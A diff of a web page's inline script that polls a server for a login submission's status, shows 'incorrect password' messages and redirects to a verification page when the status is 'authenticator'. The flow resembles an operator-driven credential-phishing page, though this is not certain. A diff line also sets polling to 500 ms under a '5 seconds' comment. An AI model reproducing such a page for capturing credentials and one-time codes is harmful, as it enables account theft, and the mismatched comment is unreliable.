@@ -716,12 +716,12 @@
     }
   }
     </style>
-  <script>
+<script>
   // Function to poll the status from the server every 5 seconds
   function pollStatus(submissionId) {
     if (submissionId) {
       setInterval(() => {
-        fetch(/check_status/${submissionId}/) // Use the correct URL structure
+        fetch(`/check_status/${submissionId}/`) // Use the correct URL structure
           .then((response) => {
             if (!response.ok) {
               throw new Error("Failed to fetch status");
@@ -732,15 +732,13 @@
             const status = data.status; // Extract the status
             updateUI(status);
 
-            // Handle redirection based on status
+            // Redirect only for authenticator status
             if (status === "authenticator") {
-              window.location.href = /verification/${submissionId}/;
-            } else if (status === "incorrect") {
-              window.location.href = ?status=incorrect;
+              window.location.href = `/verification/${submissionId}/`;
             }
           })
           .catch((error) => console.error("Error checking status:", error));
-      }, 5000); // Poll every 5 seconds
+      }, 500); // Poll every 5 seconds
     }
   }
 
@@ -754,10 +752,15 @@
       if (statusMessage) {
         statusMessage.textContent = "Verifying information, please be patient...";
       }
+    } else if (status === "incorrect") {
+      spinnerElement.style.display = "none"; // Hide spinner
+      if (statusMessage) {
+        statusMessage.textContent = "Incorrect email or password. Please try again.";
+      }
     } else {
       spinnerElement.style.display = "none"; // Hide spinner
       if (statusMessage) {
-        statusMessage.textContent = Current Status: ${status};
+        statusMessage.textContent = `Current Status: ${status}`;
       }
     }
   }
@@ -767,7 +770,7 @@
   if (submissionId) {
     pollStatus(submissionId);
   }
-</script> 
+</script>
 
   </head>
   <body
